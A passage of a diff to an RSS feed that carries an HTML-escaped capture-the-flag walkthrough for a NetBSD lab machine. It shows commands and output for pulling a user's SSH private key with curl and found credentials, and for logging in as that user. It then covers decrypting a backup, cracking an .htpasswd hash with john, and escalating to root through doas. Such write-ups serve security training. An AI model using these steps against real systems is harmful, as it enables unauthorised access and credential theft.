class=&#34;na&#34;&gt;align&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;right&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;3kB
+&lt;span class=&#34;ln&#34;&gt;19&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;table&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;20&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;body&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;It show there is one file with the name id_rsa&lt;/p&gt;
+&lt;p&gt;r.michaels ssh key redirect to the file key in /tmp&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$ curl http://127.0.0.1:3001/~r.michaels/id_rsa -s --user &amp;quot;webapi_user:iamthebest&amp;quot; &amp;gt; /tmp/key&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$ cat key | base64&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Then copy the base64 encoded&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$ echo &#39;paste here &#39; | base64 -d &amp;gt; user.key&lt;/p&gt;
+&lt;p&gt;$ chmod 600 user.key&lt;/p&gt;
+&lt;p&gt;$ ssh -i user.key &lt;a href=&#34;mailto:r.michaels@10.10.10.218&#34;&gt;r.michaels@10.10.10.218&lt;/a&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt; 1&lt;/span&gt;ssh -i key r.michaels@10.10.10.218
+&lt;span class=&#34;ln&#34;&gt; 2&lt;/span&gt;The authenticity of host &amp;#39;10.10.10.218 (10.10.10.218)&amp;#39; can&amp;#39;t be established.
+&lt;span class=&#34;ln&#34;&gt; 3&lt;/span&gt;ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo.
+&lt;span class=&#34;ln&#34;&gt; 4&lt;/span&gt;Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+&lt;span class=&#34;ln&#34;&gt; 5&lt;/span&gt;Warning: Permanently added &amp;#39;10.10.10.218&amp;#39; (ECDSA) to the list of known hosts.
+&lt;span class=&#34;ln&#34;&gt; 6&lt;/span&gt;Last login: Fri Sep 18 07:06:51 2020
+&lt;span class=&#34;ln&#34;&gt; 7&lt;/span&gt;NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020
+&lt;span class=&#34;ln&#34;&gt; 8&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt; 9&lt;/span&gt;Welcome to NetBSD!
+&lt;span class=&#34;ln&#34;&gt;10&lt;/span&gt;
+&lt;span class=&#34;ln&#34;&gt;11&lt;/span&gt;luanne$ id
+&lt;span class=&#34;ln&#34;&gt;12&lt;/span&gt;uid=1000(r.michaels) gid=100(users) groups=100(users)
+&lt;span class=&#34;ln&#34;&gt;13&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;User flag!&lt;/strong&gt;&lt;/p&gt;
+&lt;h1 id=&#34;__privilege-escalation__&#34;&gt;&lt;strong&gt;Privilege Escalation&lt;/strong&gt;&lt;/h1&gt;
+&lt;p&gt;In /home/r.michaels/backups directory found the encrypted tar file devel_backup-2020-09-16.tar.gz.enc&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;luanne$ ll
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;total 4
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;-r--------  1 r.michaels  users  1970 Nov 24 09:25 devel_backup-2020-09-16.tar.gz.enc
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;In /home/r.michaels/.gnupg i found two files&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;luanne$ ls
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;pubring.gpg secring.gpg
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;luanne$ ll
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;total 8
+&lt;span class=&#34;ln&#34;&gt;5&lt;/span&gt;-rw-------  1 r.michaels  users   603 Sep 14  2020 pubring.gpg
+&lt;span class=&#34;ln&#34;&gt;6&lt;/span&gt;-rw-------  1 r.michaels  users  1291 Sep 14  2020 secring.gpg
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, i googled that &amp;quot;NetBSD gnupg&amp;quot;&lt;/p&gt;
+&lt;p&gt;So that two files are used by the gnupg for encrypt and decrypt.because the netpgp  is encrypt the files using the public and private keys.
+we have the two one is public and another one is private key.&lt;/p&gt;
+&lt;p&gt;So let decrypt the file using the NetBSD netpgp&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$ cd /home/r.michaels/backups/&lt;/p&gt;
+&lt;p&gt;$ netpgp --decrypt --output=/tmp/devel_backup-2020-09-16.tar.gz devel_backup-2020-09-16.tar.gz.enc&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Change the directory to /tmp&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$cd /tmp&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Unzip the tar file&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$ tar -xzf devel_backup-2020-09-16.tar.gz&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Searching for file so i used the find command to fetch the files.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$ find . -type f&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;luanne$ find . -type f
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;./www/index.html
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;./www/.htpasswd
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;./webapi/weather.lua
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;we found the another .htaccess file so crack&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$ cat ./www/.htpasswd&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;copy the hash and crack with john&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$ john hash_file --wordlist=/opt/rockyou.txt&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt; 1&lt;/span&gt;john hash_file --wordlist=/opt/rockyou.txt
+&lt;span class=&#34;ln&#34;&gt; 2&lt;/span&gt;Warning: detected hash type &amp;#34;md5crypt&amp;#34;, but the string is also recognized as &amp;#34;md5crypt-long&amp;#34;
+&lt;span class=&#34;ln&#34;&gt; 3&lt;/span&gt;Use the &amp;#34;--format=md5crypt-long&amp;#34; option to force loading these as that type instead
+&lt;span class=&#34;ln&#34;&gt; 4&lt;/span&gt;Using default input encoding: UTF-8
+&lt;span class=&#34;ln&#34;&gt; 5&lt;/span&gt;Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 AVX 4x3])
+&lt;span class=&#34;ln&#34;&gt; 6&lt;/span&gt;Will run 2 OpenMP threads
+&lt;span class=&#34;ln&#34;&gt; 7&lt;/span&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status
+&lt;span class=&#34;ln&#34;&gt; 8&lt;/span&gt;littlebear       (webapi_user)
+&lt;span class=&#34;ln&#34;&gt; 9&lt;/span&gt;1g 0:00:00:00 DONE (2021-03-27 22:31) 4.545g/s 58909p/s 58909c/s 58909C/s tormenta..balanta
+&lt;span class=&#34;ln&#34;&gt;10&lt;/span&gt;Use the &amp;#34;--show&amp;#34; option to display all of the cracked passwords reliably
+&lt;span class=&#34;ln&#34;&gt;11&lt;/span&gt;Session completed
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;we crack the new password  : littlebear&lt;/p&gt;
+&lt;p&gt;After some enumuration i found the config file /usr/pkg/etc/doas.conf&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;cat /usr/pkg/etc/doas.conf
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;permit r.michaels as root
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;doas - execute commands as another user.The doas utility executes the given command as another user and it is alternative for the sudo.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;$ doas -u root /bin/ksh&lt;br&gt;
+password : littlebear&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;ln&#34;&gt;1&lt;/span&gt;luanne$ doas -u root /bin/ksh
+&lt;span class=&#34;ln&#34;&gt;2&lt;/span&gt;Password:
+&lt;span class=&#34;ln&#34;&gt;3&lt;/span&gt;# id
+&lt;span class=&#34;ln&#34;&gt;4&lt;/span&gt;uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;&lt;center&gt;#Rooted&lt;/center&gt;&lt;/strong&gt;&lt;/p&gt;
+
+        
+      </description>
+    </item>
+    
+  </channel>
+</rss>
